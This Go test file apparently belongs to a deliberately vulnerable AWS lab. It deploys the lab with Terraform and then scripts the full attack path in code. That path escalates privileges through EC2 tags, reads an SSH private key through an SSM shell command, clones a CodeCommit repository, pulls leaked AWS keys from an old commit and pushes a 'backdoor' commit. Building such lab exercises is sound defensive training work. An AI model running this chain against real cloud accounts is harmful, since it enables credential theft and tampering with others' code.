package test

import (
	"context"
	"fmt"
	"log"
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/credentials"
	git "github.com/go-git/go-git/v5"
	"github.com/go-git/go-git/v5/plumbing"
	"github.com/go-git/go-git/v5/plumbing/object"
	"github.com/go-git/go-git/v5/plumbing/transport/ssh"
	"github.com/go-git/go-git/v5/storage/memory"
	"github.com/stretchr/testify/assert"

	"github.com/aws/aws-sdk-go-v2/service/codecommit"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/iam"
	"github.com/aws/aws-sdk-go-v2/service/ssm"

	"github.com/aws/aws-sdk-go-v2/service/ec2/types"

	http_helper "github.com/gruntwork-io/terratest/modules/http-helper"
	"github.com/gruntwork-io/terratest/modules/terraform"
)

type EndToEndTest struct {
	awsConfig        aws.Config
	region           string
	t                *testing.T
	assert           *assert.Assertions
	terraformOptions *terraform.Options
	terraformDir     string
	apiUrl           string
}

const AWS_REGION string = "eu-west-1"

var ctx = context.Background()

func TestScenario(t *testing.T) {
	test := EndToEndTest{
		t:            t,
		region:       AWS_REGION,
		assert:       assert.New(t),
		terraformDir: "./fixtures",
	}

	test.Prepare()
	defer test.Cleanup()

	// Step 0: Ensure setup is functional
	// Working API implies all the build pipelines are working as well
	test.TestApi()

	// Step 1: Find instance
	test.t.Log("Searching for vulnerable EC2 instance")
	instanceId := test.FindVulnerableInstance()

	// Step 2: Tag
	test.t.Log("Overwriting tags of instance " + instanceId + " for privilege escalation")
	test.OverwriteInstanceTagsForPrivilegeEscalation(instanceId)

	// Step 3: steal SSH key
	test.t.Log("Executing SSM command on instance " + instanceId + " to steal private SSH key")
	privateSSHKey := test.StealPrivateSSHKey(instanceId)

	// Step 4: Clone CodeCommit repo
	test.t.Log("Cloning CodeCommit repository")
	sshKeyId := test.FindSSHKeyId("cloner")
	gitRepo := test.CloneCodeCommitRepository(sshKeyId, privateSSHKey)

	// Step 5: Find credentials in commit history
	test.t.Log("Searching for leaked AWS credentials in commit history")
	stepTwoCredentials, err := test.FindAWSCredentialsInCommitHistory(gitRepo)
	if err != nil {
		test.assert.Nil(err, "searching repo for creds: %s", err)
	}

	// From now on, use the credentials from step 2
	test.awsConfig = AwsConfigFromCredentials(stepTwoCredentials.AccessKeyID, stepTwoCredentials.SecretAccessKey)

	// Step 6: Backdoor application
	test.t.Log("Pushing malicious commit")
	test.PushMaliciousCommit(gitRepo)

	test.t.Log("Success!")
}

// Utility function to build an AWS config object from static credentials
func AwsConfigFromCredentials(accessKeyId string, secretAccessKey string) aws.Config {
	credentialsProvider := config.WithCredentialsProvider(
		credentials.NewStaticCredentialsProvider(accessKeyId, secretAccessKey, ""),
	)
	cfg, err := config.LoadDefaultConfig(ctx, credentialsProvider, config.WithRegion(AWS_REGION))
	if err != nil {
		log.Fatalf("unable to load SDK config, %v", err)
	}

	return cfg
}

func (test *EndToEndTest) Prepare() {
	test.terraformOptions = terraform.WithDefaultRetryableErrors(test.t, &terraform.Options{
		TerraformDir: test.terraformDir,
		Vars: map[string]interface{}{
			"region": test.region,
		},
	})

	terraform.InitAndApply(test.t, test.terraformOptions)

	// Credentials
	accessKeyId := terraform.Output(test.t, test.terraformOptions, "access_key_id")
	secretAccessKey := terraform.Output(test.t, test.terraformOptions, "secret_access_key")
	test.awsConfig = AwsConfigFromCredentials(accessKeyId, secretAccessKey)

	// API URL
	test.apiUrl = terraform.Output(test.t, test.terraformOptions, "api_url")
}

func (test *EndToEndTest) Cleanup() {
	if test.terraformOptions != nil {
		terraform.Destroy(test.t, test.terraformOptions)
	}
}

func (test *EndToEndTest) TestApi() {
	// Ensure the API is working by sending it a POST request with the expected data
	headers := map[string]string{"Content-Type": "text/html"}
	httpBody := strings.NewReader("superSecretData=foo")
	url := test.apiUrl + "/hello"
	statusCode, _ := http_helper.HTTPDo(test.t, "POST", url, httpBody, headers, nil)
	test.assert.Equal(200, statusCode)
}

func (test *EndToEndTest) FindVulnerableInstance() string {
	// Find the vulnerable EC2 instance of which to overwrite tags later
	ec2Client := ec2.NewFromConfig(test.awsConfig)
	instances, err := ec2Client.DescribeInstances(ctx, &ec2.DescribeInstancesInput{
		Filters: []types.Filter{{Name: aws.String("instance-state-name"), Values: []string{"running"}}},
	})
	test.assert.Nil(err, "unable to list running instances")
	test.assert.Equal(len(instances.Reservations[0].Instances), 1, "expected a single instance to be running")

	return *instances.Reservations[0].Instances[0].InstanceId
}

func (test *EndToEndTest) OverwriteInstanceTagsForPrivilegeEscalation(instanceId string) {
	// Overwrite the 'Environment' tags for privilege escalation
	ec2Client := ec2.NewFromConfig(test.awsConfig)
	_, err := ec2Client.CreateTags(ctx, &ec2.CreateTagsInput{
		Resources: []string{instanceId},
		Tags: []types.Tag{
			{Key: aws.String("Environment"), Value: aws.String("sandbox")},
		},
	})
	test.assert.Nil(err)
}

func (test *EndToEndTest) StealPrivateSSHKey(instanceId string) string {
	// Execute a SSM command on the instance to steal the SSH private key
	ssmClient := ssm.NewFromConfig(test.awsConfig)
	result, err := ssmClient.SendCommand(ctx, &ssm.SendCommandInput{
		DocumentName: aws.String("AWS-RunShellScript"),
		InstanceIds:  []string{instanceId},
		Parameters: map[string][]string{
			"commands": {"cat /home/ssm-user/.ssh/id_rsa"},
		},
	})
	test.assert.Nil(err, "Unable to send SSM command to instance")

	commandOutput, err := ssm.NewCommandExecutedWaiter(ssmClient).WaitForOutput(ctx, &ssm.GetCommandInvocationInput{
		CommandId:  result.Command.CommandId,
		InstanceId: &instanceId,
	}, 2*time.Minute)
	test.assert.Nil(err, "failed to retrieve SSM command output")

	return *commandOutput.StandardOutputContent
}

func (test *EndToEndTest) FindSSHKeyId(username string) string {
	// Find the SSH key ID (to be used as an username) of a specific user
	iamClient := iam.NewFromConfig(test.awsConfig)
	sshKeys, err := iamClient.ListSSHPublicKeys(ctx, &iam.ListSSHPublicKeysInput{
		UserName: aws.String(username),
	})
	test.assert.Nil(err, "failed to list SSH Keys")

	return *sshKeys.SSHPublicKeys[0].SSHPublicKeyId
}

func (test *EndToEndTest) CloneCodeCommitRepository(sshKeyId string, privateSSHKey string) *git.Repository {
	// Clone the CodeCommit repository in-memory
	pubKeys, err := ssh.NewPublicKeys(sshKeyId, []byte(privateSSHKey), "")
	test.assert.Nil(err, "unable to build git authentication object")
	cloneOptions := git.CloneOptions{
		Auth: pubKeys,
		URL:  "ssh://git-codecommit." + test.region + ".amazonaws.com/v1/repos/backend-api",
	}
	repo, err := git.Clone(memory.NewStorage(), nil, &cloneOptions)
	test.assert.Nil(err, "Unable to git clone repo")

	return repo
}

func (test *EndToEndTest) FindAWSCredentialsInCommitHistory(repo *git.Repository) (*aws.Credentials, error) {
	// Find AWS credentials in the commit history of the repository (more precisely, in the first commit)

	// Step 1: Find the first commit
	head, err := repo.Head()
	if err != nil {
		return nil, fmt.Errorf("fetching repo head: %w", err)
	}

	branchCommit, err := repo.CommitObject(head.Hash())
	if err != nil {
		return nil, fmt.Errorf("retrieving commit %s: %w", head.Hash(), err)
	}

	commits := object.NewCommitPreorderIter(branchCommit, make(map[plumbing.Hash]bool, 0), make([]plumbing.Hash, 0))
	var firstCommit *object.Commit
	err = commits.ForEach(func(c *object.Commit) error {
		firstCommit = c
		return nil
	})
	if err != nil {
		return nil, fmt.Errorf("retrieving first commit: %w", err)
	}

	// Step 2
	// We know credentials were in the first commit
	// Retrieve contents of buildspec.yml at this point in time
	files, err := firstCommit.Files()
	if err != nil {
		return nil, fmt.Errorf("getting files of first commit: %w", err)
	}

	var buildSpecContents string
	err = files.ForEach(func(f *object.File) error {
		if f.Name == "buildspec.yml" {
			buildSpecContents, _ = f.Contents()
		}
		return nil
	})
	if err != nil {
		return nil, fmt.Errorf("retrieving buildspec.yml: %w", err)
	}

	// Extract credentials from the buildspec.yml contents
	accessKeyId := regexp.MustCompile("AWS_ACCESS_KEY_ID=(.{20})").FindStringSubmatch(buildSpecContents)[1]
	secretAccessKey := regexp.MustCompile("AWS_SECRET_ACCESS_KEY=(.{40})").FindStringSubmatch(buildSpecContents)[1]

	return &aws.Credentials{
		AccessKeyID:     accessKeyId,
		SecretAccessKey: secretAccessKey,
	}, nil
}

func (test *EndToEndTest) PushMaliciousCommit(repo *git.Repository) {
	// Push a file to the CodeCommit repository
	codecommitClient := codecommit.NewFromConfig(test.awsConfig)
	head, _ := repo.Head()
	_, err := codecommitClient.PutFile(ctx, &codecommit.PutFileInput{
		BranchName:     aws.String("master"),
		FileContent:    []byte("test"),
		FilePath:       aws.String("app.py"),
		RepositoryName: aws.String("backend-api"),
		CommitMessage:  aws.String("backdoor application"),
		ParentCommitId: aws.String(head.Hash().String()),
	})
	test.assert.Nil(err, "unable to push backdooring commit")
}
